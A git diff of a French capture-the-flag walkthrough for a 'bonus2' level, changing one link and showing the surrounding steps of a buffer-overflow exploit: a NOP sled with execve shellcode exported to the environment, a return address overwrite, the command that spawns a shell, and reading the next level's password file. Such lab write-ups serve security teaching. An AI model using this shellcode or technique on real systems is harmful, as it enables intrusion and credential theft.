@@ -28,7 +28,7 @@
     gs             0x33	51
     ```
     L'`eip` a pour valeur `IJJJ` => il démarre au 24e caractère de `argv[2]` (et il faudra donc 23 caractères de *padding* dans le `argv[2]` de notre exploit).
-- Tout comme dans le [level bonus0](/bonus0/walkthrough.md), on va écraser l'`eip` et le faire pointer vers un *shellcode* exporté préalablement dans l'environnement.
+- Tout comme dans le [level bonus0](/bonus0/README.md), on va écraser l'`eip` et le faire pointer vers un *shellcode* exporté préalablement dans l'environnement.
     - `export EXPLOIT=$(python -c 'print "\x90" * 1024 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')`
     - Depuis `gdb`, mettre un *breakpoint* sur `main` puis lancer l'exécution. Utiliser `x/10s *((char **)environ)` pour retrouver l'adresse de notre exploit dans l'environnement => `0xbffff4f0`. Toutefois, cette adresse peut changer selon les arguments, on va donc ajouter 256 octets de décalage => `0xbffff5f0` (ce décalage n'impacte en rien le fonctionnement de notre exploit, puisque ce dernier commence par 1024 octets de [`NOP`](https://en.wikipedia.org/wiki/NOP_(code))).
     - ``./bonus2 `python -c 'print "A"*40'` `python -c 'print "\x90"*23 + "\xf0\xf5\xff\xbf"'` ``nous permet bien de lancer un *shell*. `cat /home/user/bonus3/.pass` pour récupérer le *flag*.
